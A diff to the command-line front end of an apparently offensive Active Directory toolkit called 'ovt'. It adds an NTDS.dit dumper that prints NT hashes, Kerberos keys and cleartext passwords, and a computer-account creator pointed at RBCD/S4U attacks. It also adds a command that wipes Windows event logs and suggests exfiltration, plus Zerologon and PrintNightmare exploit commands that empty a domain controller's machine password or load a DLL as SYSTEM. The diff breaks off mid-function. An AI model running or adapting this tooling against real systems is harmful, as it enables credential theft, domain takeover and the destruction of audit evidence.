@@ -4,9 +4,9 @@ use crate::auth::Credentials;
 use crate::banner;
 use crate::{
     AdcsAction, AzureAction, BloodHoundAction, C2Action, Cli, CrackMode, DcomExecMethod,
-    DmsaAction, DumpLsassMethod, DumpSource, ForgeAction, LocalCredDumperArg, MoveAction,
-    OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction,
-    ShadowCredAction, ShellType,
+    DmsaAction, DumpLsassMethod, DumpSource, EventsAction, ForgeAction, LocalCredDumperArg,
+    MoveAction, OutputFormat, PluginAction, PrintnightmareAction, ReportFormat, ScanType,
+    SccmAction, SccmTechnique, SecretsAction, ShadowCredAction, ShellType, ZerologonAction,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
@@ -310,6 +310,12 @@ pub async fn cmd_local_creds(
         }
         if let Some(ref k) = cred.aes256 {
             parts.push(format!("aes256:{k}"));
+        }
+        if let Some(ref k) = cred.aes128 {
+            parts.push(format!("aes128:{k}"));
+        }
+        if let Some(ref k) = cred.rc4 {
+            parts.push(format!("rc4:{k}"));
         }
         if let Some(ref p) = cred.plaintext {
             parts.push(format!("plaintext:{p}"));
@@ -1016,6 +1022,13 @@ pub async fn cmd_dump_lsass(
             format!("{}", result.aes256_count).cyan()
         );
     }
+    if result.aes128_count > 0 {
+        println!(
+            " {} AES128 keys: {}",
+            ">".bright_black(),
+            format!("{}", result.aes128_count).cyan()
+        );
+    }
     println!(
         " {} Method used: {}",
         ">".bright_black(),
@@ -1029,6 +1042,12 @@ pub async fn cmd_dump_lsass(
         }
         if let Some(ref k) = cred.aes256 {
             pieces.push(format!("aes256:{}", k));
+        }
+        if let Some(ref k) = cred.aes128 {
+            pieces.push(format!("aes128:{}", k));
+        }
+        if let Some(ref k) = cred.rc4 {
+            pieces.push(format!("rc4:{}", k));
         }
         println!(
             " {} {} {}",
@@ -5065,7 +5084,192 @@ pub async fn cmd_secrets(action: &SecretsAction) -> i32 {
             }
             0
         }
+        SecretsAction::NtdsDit {
+            ntds,
+            system,
+            bootkey,
+            output,
+            include_deleted,
+        } => {
+            use overthrone_core::postex::ntds_dit::{
+                NtdsDumpOptions, dump_ntds_dit, filter_user_accounts,
+            };
+            use overthrone_core::proto::secretsdump::extract_boot_key;
+
+            let ntds_data = match tokio::fs::read(ntds).await {
+                Ok(d) => d,
+                Err(e) => {
+                    banner::print_fail(&format!("Failed to read NTDS.dit: {}", e));
+                    return 1;
+                }
+            };
+            let _ = &ntds_data;
+
+            // Resolve the boot key: --bootkey hex wins, else --system hive
+            let boot_key: Option<[u8; 16]> = if let Some(hexstr) = bootkey {
+                match hex::decode(hexstr.trim().trim_start_matches("0x")) {
+                    Ok(h) if h.len() == 16 => {
+                        let mut k = [0u8; 16];
+                        k.copy_from_slice(&h);
+                        banner::print_success("Boot key loaded from --bootkey");
+                        Some(k)
+                    }
+                    Ok(h) => {
+                        banner::print_fail(&format!(
+                            "--bootkey must be 32 hex chars (16 bytes), got {} bytes",
+                            h.len()
+                        ));
+                        return 1;
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("--bootkey is not valid hex: {e}"));
+                        return 1;
+                    }
+                }
+            } else if let Some(system_path) = system {
+                let system_data = match tokio::fs::read(system_path).await {
+                    Ok(d) => d,
+                    Err(e) => {
+                        banner::print_fail(&format!("Failed to read SYSTEM hive: {}", e));
+                        return 1;
+                    }
+                };
+                match extract_boot_key(&system_data) {
+                    Ok(k) => {
+                        banner::print_success(&format!(
+                            "Boot key extracted from SYSTEM hive: {}",
+                            hex::encode(k)
+                        ));
+                        Some(k)
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("Boot key extraction failed: {e}"));
+                        banner::print_warn(
+                            "Continuing WITHOUT decryption -- passwords will be reported as raw blobs.",
+                        );
+                        None
+                    }
+                }
+            } else {
+                banner::print_warn(
+                    "No --system hive and no --bootkey given -- hashes will NOT be decrypted.",
+                );
+                None
+            };
+
+            let options = NtdsDumpOptions {
+                boot_key,
+                skip_deleted: !include_deleted,
+            };
+
+            let dump_start = std::time::Instant::now();
+            match dump_ntds_dit(&ntds_data, &options) {
+                Ok(dump) => {
+                    let users: Vec<_> = filter_user_accounts(&dump).collect();
+                    let has_pek = !dump.pek_keys.is_empty();
+                    banner::print_success(&format!(
+                        "Parsed datatable in {:.1}s -- {} account objects, {} PEK key(s) recovered",
+                        dump_start.elapsed().as_secs_f32(),
+                        users.len(),
+                        dump.pek_keys.len()
+                    ));
+                    if !has_pek && boot_key.is_some() {
+                        banner::print_warn(
+                            "PEK list missing or undecryptable (dirty shutdown / CNG dit?) -- hashes stay raw.",
+                        );
+                    }
+
+                    let mut lines: Vec<String> = Vec::new();
+                    for acct in &users {
+                        let sam = acct.sam_account.clone().unwrap_or_default();
+                        let rid = acct.rid.unwrap_or(0);
+                        let lm = acct
+                            .lm_hash
+                            .map(hex::encode)
+                            .unwrap_or_else(|| "aad3b435b51404eeaad3b435b51404ee".into());
+                        let nt = if let Some(nt) = acct.nt_hash {
+                            nhex(nt)
+                        } else if let Some(raw) = &acct.nt_hash_raw {
+                            // undecryptable blob: report honestly, no fake hash
+                            let note = format!(
+                                "[!] {sam} (RID {rid}): NT hash UNDECRYPTED ({} bytes; no PEK)",
+                                raw.len()
+                            );
+                            println!(" {}", note.yellow());
+                            lines.push(note);
+                            String::new()
+                        } else {
+                            nhex([0u8; 16])
+                        };
+                        if !nt.is_empty() {
+                            let line = format!("LAN\\{sam}:{rid}:{lm}:{nt}:::");
+                            println!(" {}", line);
+                            lines.push(line);
+                        }
+                        for (i, h) in acct.nt_history.iter().enumerate() {
+                            let line = format!("LAN\\{sam}_history{}:${}$NT${}", i, i, nhex(*h));
+                            println!("  {}", line.dimmed());
+                            lines.push(line);
+                        }
+                        for (etype, key) in &acct.kerberos_keys {
+                            let etype_label = if *etype == 17 {
+                                "aes128"
+                            } else if *etype == 18 {
+                                "aes256"
+                            } else {
+                                "rc4"
+                            };
+                            let line = format!(
+                                " {sam}:{etype_label}{}:",
+                                if etype_label == "rc4" { "hmac" } else { "_" },
+                            );
+                            let mut line = line.replace("_:", "");
+                            line.push_str(&hex::encode(key));
+                            println!("  {}", line.yellow());
+                            lines.push(line.trim().to_string());
+                        }
+                        if !acct.wdigest.is_empty() {
+                            let line = format!(" {sam}:wdigest:{}", hex::encode(acct.wdigest[0]));
+                            lines.push(line);
+                        }
+                        if let Some(ct) = &acct.cleartext {
+                            let line = format!(" {sam}:cleartext:{ct}");
+                            println!("  {}", line.red());
+                            lines.push(line.trim().to_string());
+                        }
+                    }
+                    banner::print_success(&format!(
+                        "NTDS dump completed -- {} user lines{}",
+                        lines.len(),
+                        if dump.skipped_records > 0 {
+                            format!(", {} non-account rows skipped", dump.skipped_records)
+                        } else {
+                            String::new()
+                        }
+                    ));
+
+                    if let Some(path) = output {
+                        let contents = lines.join("\n") + "\n";
+                        if let Err(e) = std::fs::write(path, contents) {
+                            banner::print_fail(&format!("Failed to write output file: {e}"));
+                        } else {
+                            banner::print_success(&format!("Wrote {path}"));
+                        }
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("NTDS.dit parse failed: {e}"));
+                    1
+                }
+            }
+        }
     }
+}
+
+/// lowercase NT hash hex helper
+fn nhex(h: [u8; 16]) -> String {
+    hex::encode(h)
 }
 
 // ----------------------------------------------
@@ -6135,7 +6339,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
             target_dn,
             target_sam,
             mapping,
-            dc,
+            ldap_host,
             live,
         } => {
             println!(
@@ -6151,7 +6355,9 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 target_sam: target_sam.clone(),
                 mapping_value: mapping.clone(),
                 mapping_style: overthrone_core::adcs::MappingStyle::Rfc822,
-                dc_host: dc.clone().unwrap_or_else(|| "DC.DOMAIN.LOCAL".to_string()),
+                dc_host: ldap_host
+                    .clone()
+                    .unwrap_or_else(|| "DC.DOMAIN.LOCAL".to_string()),
                 domain: "DOMAIN.LOCAL".to_string(),
                 use_ldaps: false,
             };
@@ -6163,7 +6369,7 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                     Ok(c) => c,
                     Err(e) => return e,
                 };
-                let dc_host = match dc {
+                let dc_host = match ldap_host {
                     Some(d) => d.clone(),
                     None => match crate::require_dc(cli) {
                         Ok(d) => d,
@@ -7057,6 +7263,7 @@ pub async fn cmd_scan(
 
     let core_scan_type = match scan_type {
         ScanType::Syn => CoreScanType::Syn,
+        ScanType::Adws => CoreScanType::Connect,
         ScanType::Connect => CoreScanType::Connect,
         ScanType::Ack => CoreScanType::Ack,
     };
@@ -8102,8 +8309,22 @@ pub async fn cmd_kpasswd(
 // cmd_describe_ticket -- parse KIRBI/ccache
 // ----------------------------------------------
 
-pub async fn cmd_describe_ticket(cli: &Cli, file: &str) -> i32 {
+pub async fn cmd_describe_ticket(cli: &Cli, file: &str, format: Option<&str>) -> i32 {
     banner::print_module_banner("DESCRIBE TICKET");
+
+    // `format` comes from the standalone `ovt ticket` subcommand's --format
+    // flag (json|human); `ovt kerberos describe` passes None and inherits the
+    // global --output-format override.
+    if let Some(f) = format
+        && !f.eq_ignore_ascii_case("json")
+        && !f.eq_ignore_ascii_case("human")
+    {
+        banner::print_fail(&format!(
+            "Unknown format '{f}' (expected 'json' or 'human')"
+        ));
+        return 1;
+    }
+    let force_human = format.is_some_and(|f| !f.eq_ignore_ascii_case("json"));
 
     let bytes = match std::fs::read(file) {
         Ok(b) => b,
@@ -8113,38 +8334,217 @@ pub async fn cmd_describe_ticket(cli: &Cli, file: &str) -> i32 {
         }
     };
 
-    let description =
-        if bytes.starts_with(b"\x76\xff\xff\xff") || bytes.starts_with(b"\x76\x01\x00\x00") {
-            // Microsoft KIRBI format starts with 0x76 (APPLICATION 10 TAG)
-            format!("KIRBI file: {} bytes", bytes.len())
-        } else if bytes.starts_with(b"krb5cc-") || bytes.starts_with(b"krb5cc_") {
-            format!("ccache file: {} bytes", bytes.len())
-        } else {
-            format!("Unknown ticket format: {} bytes", bytes.len())
-        };
+    let d = match overthrone_hunter::tickets::describe_ticket(&bytes) {
+        Ok(d) => d,
+        Err(e) => {
+            banner::print_fail(&format!("Failed to parse ticket: {e}"));
+            return 1;
+        }
+    };
 
-    if wants_json(cli) {
+    if wants_json(cli) && !force_human {
         return emit_json(
             cli,
             serde_json::json!({
                 "status": "success",
                 "file": file,
-                "size": bytes.len(),
-                "description": description,
-                "hex_header": hex::encode(&bytes[..bytes.len().min(16)]),
+                "ticket": d,
             }),
         );
     }
 
-    println!("{} {}", "[+]".green(), file.cyan());
-    println!("{} {}", ">".bright_black(), description);
+    println!("{} {} ({} bytes)", "[+]".green(), file.cyan(), d.byte_size);
+
+    let mut format_detail = d.format.clone();
+    match d.enc_part_plaintext {
+        Some(true) => format_detail.push_str(" (plaintext enc-part)"),
+        Some(false) => format_detail.push_str(" (encrypted enc-part)"),
+        None => {}
+    }
+    println!("{:>12} : {}", "Format", format_detail);
     println!(
-        "{} Header: {}",
-        ">".bright_black(),
-        hex::encode(&bytes[..bytes.len().min(16)])
+        "{:>12} : {} @ {}",
+        "Client",
+        d.client_principal.cyan(),
+        d.client_realm.cyan()
     );
+    println!(
+        "{:>12} : {}{} [realm: {}]",
+        "Service",
+        d.service_principal.cyan(),
+        if d.is_tgt { "  [TGT]" } else { "" },
+        d.service_realm.cyan()
+    );
+    println!(
+        "{:>12} : 0x{:08x} ({})",
+        "Flags",
+        d.flags,
+        if d.flag_names.is_empty() {
+            "unknown".to_string()
+        } else {
+            d.flag_names.join(", ")
+        }
+    );
+    println!(
+        "{:>12} : {} {}",
+        "Ticket etype",
+        d.ticket_etype,
+        overthrone_hunter::tickets::etype_name(d.ticket_etype)
+    );
+    println!(
+        "{:>12} : {} (kvno {:?})",
+        "Ticket kvno",
+        d.kvno
+            .map_or_else(|| "unknown".to_string(), |k| k.to_string()),
+        d.kvno
+    );
+    if let Some(key_hex) = &d.session_key_hex {
+        println!(
+            "{:>12} : {} [{} bytes]",
+            "Session key",
+            key_hex.yellow(),
+            key_hex.len() / 2
+        );
+        println!(
+            "{:>12} : {}",
+            "Key etype",
+            overthrone_hunter::tickets::etype_name(d.session_key_etype)
+        );
+    }
+    for (label, value) in [
+        ("Authtime", &d.authtime),
+        ("Starttime", &d.starttime),
+        ("Endtime", &d.endtime),
+        (" Renew-till", &d.renew_till),
+    ] {
+        if let Some(t) = value {
+            println!("{:>12} : {}", label, t);
+        }
+    }
+    let status = match d.seconds_to_expiry {
+        Some(s) if s > 0 => {
+            let (h, m) = (s / 3600, (s % 3600) / 60);
+            format!("VALID (expires in {h}h {m}m)")
+        }
+        Some(_) => "EXPIRED".to_string(),
+        None => "UNKNOWN (no endtime)".to_string(),
+    };
+    let status_color = match (d.expired, d.seconds_to_expiry) {
+        (Some(false), Some(s)) if s > 0 => status.green().to_string(),
+        (Some(true), _) => status.red().to_string(),
+        _ => status.yellow().to_string(),
+    };
+    println!("{:>12} : {}", "Status", status_color);
+
+    if d.is_tgt {
+        println!(
+            "{} This is a TGT -- usable as {file} with ovt kerberos get-tgs / pass-the-ticket",
+            ">".bright_black()
+        );
+    }
     banner::print_success("Ticket described");
     0
+}
+
+// ----------------------------------------------
+// cmd_add_computer -- standalone computer account creation/deletion
+// ----------------------------------------------
+
+pub async fn cmd_add_computer(
+    cli: &Cli,
+    name: &str,
+    password: Option<&str>,
+    container: Option<&str>,
+    delete: bool,
+) -> i32 {
+    banner::print_module_banner("ADD-COMPUTER");
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+    let dc = match crate::require_dc(cli) {
+        Ok(d) => d,
+        Err(e) => return e,
+    };
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required for add-computer");
+            return 1;
+        }
+    };
+
+    let mut ldap = match connect_ldap_session(&dc, &domain, &creds).await {
+        Ok(l) => l,
+        Err(e) => return e,
+    };
+
+    if delete {
+        // Resolve the DN of the computer account first (it may be in any
+        // container), falling back to CN=Computers/<base>
+        let filter = format!(
+            "(&(objectCategory=computer)(sAMAccountName={}$))",
+            name.trim_end_matches('$')
+        );
+        match ldap.custom_search(&filter, &["distinguishedName"]).await {
+            Ok(entries) => {
+                if let Some(dn) = entries
+                    .first()
+                    .and_then(|e| e.attrs.get("distinguishedName"))
+                    .and_then(|v| v.first())
+                    .cloned()
+                {
+                    match ldap.delete_entry(&dn).await {
+                        Ok(_) => {
+                            banner::print_success(&format!("Deleted computer account {dn}"));
+                            0
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Failed to delete {dn}: {e}"));
+                            1
+                        }
+                    }
+                } else {
+                    banner::print_fail(&format!("Computer account '{name}$' not found"));
+                    1
+                }
+            }
+            Err(e) => {
+                banner::print_fail(&format!("Failed to search for computer account: {e}"));
+                1
+            }
+        }
+    } else {
+        let password = match password {
+            Some(p) => p.to_string(),
+            None => {
+                use rand::distr::SampleString;
+                let mut rng = rand::rng();
+                let p = rand::distr::Alphanumeric.sample_string(&mut rng, 24);
+                banner::print_info(&format!("Generated random password: {p}"));
+                p
+            }
+        };
+
+        match ldap.add_computer(name, &password, container).await {
+            Ok(dn) => {
+                banner::print_success(&format!(
+                    "Created computer account {dn} (sAMAccountName: {}$)",
+                    name.trim_end_matches('$')
+                ));
+                println!("{} Password: {}", ">".bright_black(), password.yellow());
+                println!(
+                    "{} Now usable for RBCD/S4U attacks: ovt rbcd set --delegate-to {name}",
+                    ">".bright_black()
+                );
+                0
+            }
+            Err(e) => {
+                banner::print_fail(&format!("Failed to create computer account: {e}"));
+                1
+            }
+        }
+    }
 }
 
 // ----------------------------------------------
@@ -9122,4 +9522,589 @@ pub async fn get_cached_tgt_opsec(
     }
 
     Ok(tgt)
+}
+
+// ----------------------------------------------
+// cmd_events -- clear / backup Windows event logs via MS-EVEN RPC
+// ----------------------------------------------
+
+pub async fn cmd_events(cli: &Cli, action: &EventsAction) -> i32 {
+    let (target, log_name, mode) = match action {
+        EventsAction::Clear {
+            target,
+            log_name,
+            path: _,
+        } => (target.clone(), log_name.clone(), "clear"),
+        EventsAction::Backup {
+            target,
+            log_name,
+            path: _,
+        } => (target.clone(), log_name.clone(), "backup"),
+    };
+    banner::print_module_banner(&format!("EVENTS {}", mode.to_uppercase()));
+
+    let creds = match crate::require_creds(cli) {
+        Ok(c) => c,
+        Err(e) => return e,
+    };
+
+    let smb = match connect_smb_session(&target, &creds).await {
+        Ok(s) => s,
+        Err(e) => return e,
+    };
+
+    match action {
+        EventsAction::Clear { path, .. } => {
+            let target_path = path
+                .as_deref()
+                .map(|p| p.to_string())
+                .unwrap_or_else(|| format!("C:\\Windows\\System32\\Winevt\\Logs\\{log_name}.evtx"));
+            match overthrone_core::proto::even::even_create_file(&smb, &target_path).await {
+                Ok(_) => {
+                    banner::print_success(&format!(
+                        "Log file truncated via ElfrClearLogFileW: {target_path}"
+                    ));
+                    println!(
+                        "{} MS-EVEN cleared {} as SYSTEM over RPC -- event log is now empty on disk",
+                        "[+]".green(),
+                        log_name.cyan()
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Event log clear failed: {e}"));
+                    println!(
+                        "{} Fallback: try {} to create the file instead",
+                        ">".bright_black(),
+                        "ovt events backup".cyan()
+                    );
+                    1
+                }
+            }
+        }
+        EventsAction::Backup { path, .. } => {
+            match overthrone_core::proto::even::even_backup_log(&smb, &log_name, path).await {
+                Ok(_) => {
+                    banner::print_success(&format!(
+                        "Log backed up via ElfrBackupEventLogW: {log_name} -> {path}"
+                    ));
+                    println!(
+                        "{} Now exfiltrate {} over the SMB share of your choice",
+                        ">".bright_black(),
+                        path.cyan()
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Event log backup failed: {e}"));
+                    1
+                }
+            }
+        }
+    }
+}
+
+// ----------------------------------------------
+// connect_smb_session -- shared SMB bootstrap from credentials
+// ----------------------------------------------
+
+pub async fn connect_smb_session(
+    target: &str,
+    creds: &Credentials,
+) -> std::result::Result<overthrone_core::proto::smb::SmbSession, i32> {
+    let session = match &creds.auth {
+        crate::auth::AuthData::Password(pass) => {
+            overthrone_core::proto::smb::SmbSession::connect(
+                target,
+                &creds.domain,
+                &creds.username,
+                pass,
+            )
+            .await
+        }
+        crate::auth::AuthData::NtlmHash(hash) => {
+            overthrone_core::proto::smb::SmbSession::connect_with_hash(
+                target,
+                &creds.domain,
+                &creds.username,
+                hash,
+            )
+            .await
+        }
+        crate::auth::AuthData::KerberosTicket(ticket_path) => {
+            let ticket = overthrone_core::proto::smb::KerberosTicket::from_kirbi(ticket_path);
+            match ticket {
+                Ok(t) => {
+                    overthrone_core::proto::smb::SmbSession::connect_with_ticket(
+                        target,
+                        &creds.domain,
+                        &creds.username,
+                        t,
+                    )
+                    .await
+                }
+                Err(e) => Err(e),
+            }
+        }
+    };
+    session.map_err(|e| {
+        banner::print_fail(&format!("SMB connect to {target} failed: {e}"));
+        1
+    })
+}
+
+// ----------------------------------------------
+// cmd_zerologon -- CVE-2020-1472
+// ----------------------------------------------
+
+pub async fn cmd_zerologon(cli: &Cli, action: &ZerologonAction) -> i32 {
+    use overthrone_core::proto::netlogon::{zerologon_check, zerologon_exploit, zerologon_probe};
+
+    banner::print_module_banner("ZEROLOGON (CVE-2020-1472)");
+
+    // ZeroLogon runs unauthenticated. Any --username/--password on the CLI is
+    // only used to obtain the SMB session shell for check/probe; the exploit
+    // always connects anonymously.
+    let domain = cli.domain.clone().unwrap_or_default();
+    let username = cli.username.clone().unwrap_or_default();
+    let password = cli.password.clone().unwrap_or_default();
+
+    fn check_json(r: &overthrone_core::proto::netlogon::ZerologonCheckResult) -> serde_json::Value {
+        serde_json::json!({
+            "vulnerable": r.vulnerable,
+            "method": match r.method {
+                overthrone_core::proto::netlogon::ZerologonCheckMethod::EmptyPassword =>
+                    "empty_password",
+                overthrone_core::proto::netlogon::ZerologonCheckMethod::AuthBypassProbe =>
+                    "auth_bypass_probe",
+            },
+            "attempts": r.attempts,
+            "status": r.status.map(|s| format!("0x{s:08X}")),
+            "account": r.account,
+        })
+    }
+
+    match action {
+        ZerologonAction::Check {
+            target,
+            computer_name,
+        } => {
+            println!(
+                " {} Deterministic empty-password check against {}",
+                ">".bright_black(),
+                target.cyan()
+            );
+            match zerologon_check(
+                target,
+                &domain,
+                &username,
+                &password,
+                computer_name.as_deref().unwrap_or(""),
+            )
+            .await
+            {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(cli, check_json(&result));
+                    }
+                    if result.vulnerable {
+                        println!(
+                            "{} VULNERABLE (attempt {}): empty machine password \
+                             accepted as '{}$'",
+                            "[+]".green(),
+                            result.attempts,
+                            result.account.cyan()
+                        );
+                        banner::print_info(
+                            "Machine password is ALREADY empty. Run `ovt zerologon \
+                             exploit --target ... --force` to reset it via \
+                             PasswordSet2, then DCSync immediately.",
+                        );
+                        return 0;
+                    }
+                    println!(
+                        "{} not vulnerable via empty-password method (attempt \
+                         {}: status {}).",
+                        "[-]".yellow(),
+                        result.attempts,
+                        result
+                            .status
+                            .map(|s| format!("0x{s:08X}"))
+                            .unwrap_or_else(|| "unknown".to_string())
+                    );
+                    banner::print_info(
+                        "The machine password is set -- use `ovt zerologon probe` \
+                         for the 1/256 auth-bypass check (works even when the \
+                         machine password is not empty).",
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Zerologon check failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        ZerologonAction::Probe {
+            target,
+            computer_name,
+            max_attempts,
+        } => {
+            println!(
+                " {} Probabilistic auth-bypass probe against {} ({} attempts, \
+                 ~1/256 each, noisy)",
+                ">".bright_black(),
+                target.cyan(),
+                max_attempts
+            );
+            match zerologon_probe(
+                target,
+                &domain,
+                &username,
+                &password,
+                computer_name.as_deref().unwrap_or(""),
+                *max_attempts,
+            )
+            .await
+            {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(cli, check_json(&result));
+                    }
+                    if result.vulnerable {
+                        println!(
+                            "{} VULNERABLE -- auth bypass succeeded on attempt {} \
+                             as '{}$'",
+                            "[+]".green(),
+                            result.attempts,
+                            result.account.cyan()
+                        );
+                        banner::print_info(
+                            "Run `ovt zerologon exploit --target ... --force` to \
+                             empty the machine account password, then DCSync \
+                             immediately.",
+                        );
+                        return 0;
+                    }
+                    println!(
+                        "{} No auth bypass after {} attempts -- target is patched \
+                         (August 2021+: KB4565503 / hardening enabled).",
+                        "[-]".yellow(),
+                        result.attempts
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Zerologon probe failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        ZerologonAction::Exploit {
+            target,
+            computer_name,
+            max_attempts,
+            force,
+        } => {
+            if !*force {
+                banner::print_fail(
+                    "Refusing to run: this exploit RESETS the DC's machine \
+                     account password to empty -- the domain's Netlogon secure \
+                     channel breaks and authentication degrades until the \
+                     password is restored. Only run against systems you are \
+                     authorised to break.",
+                );
+                banner::print_info(&format!(
+                    "Re-run with {} to proceed (DCSync the empty-password hash \
+                     31d6cfe0d16ae931b73c59d7e0c089c0 IMMEDIATELY after and \
+                     restore the machine password).",
+                    "--force".cyan()
+                ));
+                return 1;
+            }
+
+            println!(
+                " {} DESTRUCTIVE exploit against {} (max {} attempts per phase)",
+                ">".bright_black(),
+                target.cyan(),
+                max_attempts
+            );
+            match zerologon_exploit(
+                target,
+                computer_name.as_deref().unwrap_or(""),
+                *max_attempts,
+            )
+            .await
+            {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(
+                            cli,
+                            serde_json::json!({
+                                "vulnerable": result.vulnerable,
+                                "attempts": result.attempts,
+                                "password_reset": result.password_reset,
+                                "reset_attempts": result.reset_attempts,
+                                "account": result.account,
+                                "restore_guidance": result.restore_guidance,
+                            }),
+                        );
+                    }
+                    if !result.vulnerable {
+                        println!(
+                            "{} Not vulnerable -- no auth bypass after {} attempts.",
+                            "[-]".yellow(),
+                            result.attempts
+                        );
+                        banner::print_fail(
+                            "Exploit failed: the DC rejected the ZeroLogon auth \
+                             bypass (patched or hardened).",
+                        );
+                        return 1;
+                    }
+                    println!(
+                        "{} Auth bypass accepted after {} attempts (account '{}$')",
+                        "[+]".green(),
+                        result.attempts,
+                        result.account.cyan()
+                    );
+                    if result.password_reset {
+                        println!(
+                            "{} Machine account password RESET to empty on \
+                             attempt {}.",
+                            "[+]".green(),
+                            result.reset_attempts.to_string().red()
+                        );
+                    } else {
+                        println!(
+                            "{} Auth bypass succeeded but PasswordSet2 did not \
+                             confirm success ({} reset attempts).",
+                            "[-]".yellow(),
+                            result.reset_attempts
+                        );
+                    }
+                    for line in &result.restore_guidance {
+                        println!("  {} {}", "!".yellow(), line);
+                    }
+                    banner::print_fail(
+                        "THE DC MACHINE PASSWORD IS NOW EMPTY -- the domain \
+                         secure channel is broken. DCSync now, restore fast.",
+                    );
+                    if result.password_reset { 0 } else { 1 }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Zerologon exploit failed: {e}"));
+                    1
+                }
+            }
+        }
+    }
+}
+
+// ----------------------------------------------
+// cmd_printnightmare -- CVE-2021-1675 / CVE-2021-34527
+// ----------------------------------------------
+
+pub async fn cmd_printnightmare(cli: &Cli, action: &PrintnightmareAction) -> i32 {
+    use overthrone_core::proto::coerce::CoerceCreds;
+    use overthrone_core::proto::printnightmare::{
+        printnightmare_check, printnightmare_delete, printnightmare_exploit, printnightmare_list,
+    };
+
+    banner::print_module_banner("PRINTNIGHTMARE (CVE-2021-1675 / CVE-2021-34527)");
+
+    // Creds are optional: check/list can run over a null session, exploit
+    // normally needs an authenticated session with local printer access.
+    let creds = match (cli.username.as_deref(), cli.password.as_deref()) {
+        (Some(u), Some(p)) => Some(CoerceCreds {
+            domain: cli.domain.clone().unwrap_or_else(|| ".".to_string()),
+            username: u.to_string(),
+            password: p.to_string(),
+        }),
+        (Some(_), None) => {
+            banner::print_fail(
+                "--username given without --password. Pass --password/--domain, \
+                 or omit both to attempt an unauthenticated null session.",
+            );
+            return 1;
+        }
+        _ => None,
+    };
+    if let Some(c) = &creds {
+        println!(
+            " {} Session: {}\\{} (authenticated)",
+            ">".bright_black(),
+            c.domain.cyan(),
+            c.username.cyan()
+        );
+    } else {
+        println!(" {} Session: null (unauthenticated)", ">".bright_black());
+    }
+
+    fn result_json(
+        result: &overthrone_core::proto::printnightmare::PrintNightmareResult,
+    ) -> serde_json::Value {
+        serde_json::json!({
+            "target": result.target,
+            "mode": result.mode.to_string(),
+            "success": result.success,
+            "status_code": result
+                .status_code
+                .map(|s| format!("0x{s:08X}")),
+            "message": result.message,
+        })
+    }
+
+    match action {
+        PrintnightmareAction::Check { target } => {
+            println!(
+                " {} Spooler check against {}",
+                ">".bright_black(),
+                target.cyan()
+            );
+            match printnightmare_check(target, creds.as_ref()).await {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(cli, result_json(&result));
+                    }
+                    if result.success {
+                        banner::print_success(&result.message);
+                        0
+                    } else {
+                        banner::print_fail(&result.message);
+                        0
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("PrintNightmare check failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        PrintnightmareAction::Exploit {
+            target,
+            dll,
+            driver_name,
+        } => {
+            println!(
+                " {} Installing driver '{}' on {} (loads {} as SYSTEM)",
+                ">".bright_black(),
+                driver_name.cyan(),
+                target.cyan(),
+                dll.yellow()
+            );
+            match printnightmare_exploit(target, dll, driver_name, creds.as_ref()).await {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(cli, result_json(&result));
+                    }
+                    if result.success {
+                        banner::print_success(&result.message);
+                        banner::print_info(
+                            "Ensure the DLL content is reachable anonymously at \
+                             the UNC path. Clean up with `ovt printnightmare \
+                             delete --target <host> --driver-name <name>`.",
+                        );
+                        0
+                    } else {
+                        banner::print_fail(&result.message);
+                        1
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("PrintNightmare exploit failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        PrintnightmareAction::Delete {
+            target,
+            driver_name,
+        } => {
+            println!(
+                " {} Deleting driver '{}' on {}",
+                ">".bright_black(),
+                driver_name.cyan(),
+                target.cyan()
+            );
+            match printnightmare_delete(target, driver_name, creds.as_ref()).await {
+                Ok(result) => {
+                    if wants_json(cli) {
+                        return emit_json(cli, result_json(&result));
+                    }
+                    if result.success {
+                        banner::print_success(&result.message);
+                        0
+                    } else {
+                        banner::print_fail(&result.message);
+                        1
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("PrintNightmare delete failed: {e}"));
+                    1
+                }
+            }
+        }
+
+        PrintnightmareAction::List { target } => {
+            println!(
+                " {} Enumerating printer drivers on {}",
+                ">".bright_black(),
+                target.cyan()
+            );
+            match printnightmare_list(target, creds.as_ref()).await {
+                Ok(drivers) => {
+                    if wants_json(cli) {
+                        let entries: Vec<serde_json::Value> = drivers
+                            .iter()
+                            .map(|d| {
+                                serde_json::json!({
+                                    "c_version": d.c_version,
+                                    "name": d.name,
+                                    "environment": d.environment,
+                                    "driver_path": d.driver_path,
+                                    "data_file": d.data_file,
+                                    "config_file": d.config_file,
+                                })
+                            })
+                            .collect();
+                        return emit_json(
+                            cli,
+                            serde_json::json!({ "target": target, "total": entries.len(), "drivers": entries }),
+                        );
+                    }
+                    if drivers.is_empty() {
+                        banner::print_fail(
+                            "No drivers returned (null-session access denied or \
+                             unparseable layout).",
+                        );
+                        return 1;
+                    }
